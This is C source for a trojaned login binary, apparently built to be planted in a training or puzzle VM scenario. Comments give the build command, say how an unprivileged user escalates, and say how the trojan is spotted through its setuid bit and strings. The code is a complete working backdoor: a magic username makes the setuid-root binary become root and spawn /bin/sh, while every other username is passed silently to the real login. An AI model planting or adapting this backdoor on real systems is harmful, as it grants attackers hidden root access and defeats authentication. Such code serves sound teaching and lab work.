/*
 * login (trojaned) -- Berkeley Underground, Box 2 "The Traced Call".
 *
 * Faithful to TIMELINE 4015/4016 (a trojaned /bin/login that hands out root) and
 * 4007 (the 'wank' trigger word).  A magic username drops a root shell; ANY other
 * username is handed unchanged to the real login (saved alongside as login.real),
 * so normal authentication -- including the player's own foothold -- is untouched.
 *
 * The tell: a setuid-root login binary is abnormal.  `ls -l` shows the setuid
 * bit; `strings` on the binary leaks the magic word.  Build (in the guest):
 *   cc -DMAGIC='"wank"' -DREAL='"/usr/bin/login.real"' -o login login-trojan.c
 *
 * Because the binary is setuid-root, an unprivileged foothold user who runs
 *   $ login            (then types the magic word)
 * lands in a uid-0 shell.
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#ifndef MAGIC
#define MAGIC "wank"
#endif
#ifndef REAL
#define REAL "/usr/bin/login.real"
#endif

int main(int argc, char **argv)
{
	char line[256];
	char *user = NULL;
	int i;

	/* A username may already be on the command line.  Skip option flags --
	 * crucially -h and -f each take a FOLLOWING argument (telnetd execs us as
	 * `login -h <host> -p`), so we must skip that value too, or we'd mistake the
	 * hostname for the username and break the telnet foothold. */
	for (i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "-f") == 0) { i++; continue; }
		if (argv[i][0] == '-') continue;
		user = argv[i]; break;
	}

	if (user == NULL) {			/* prompt exactly like real login does */
		printf("login: ");
		fflush(stdout);
		if (fgets(line, sizeof line, stdin) == NULL)
			return 1;
		line[strcspn(line, "\r\n")] = '\0';
		user = line;
	}

	if (strcmp(user, MAGIC) == 0) {		/* the backdoor */
		setgid(0);
		setuid(0);			/* setuid-root binary -> become root */
		execl("/bin/sh", "-sh", (char *)NULL);
		perror("login: exec /bin/sh");
		return 1;
	}

	/* not the magic word: hand the typed username to the genuine login */
	execl(REAL, "login", user, (char *)NULL);
	perror("login: exec " REAL);
	return 1;
}
